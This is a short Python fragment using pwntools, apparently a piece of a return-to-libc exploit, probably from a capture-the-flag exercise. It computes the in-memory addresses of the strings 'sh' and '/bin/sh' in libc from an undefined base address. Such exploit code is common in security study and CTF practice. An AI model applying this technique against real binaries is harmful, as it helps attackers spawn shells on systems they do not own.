from pwn import *

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so')
sh = base + next(libc.search('sh\x00'))
binsh = base + next(libc.search('/bin/sh\x00'))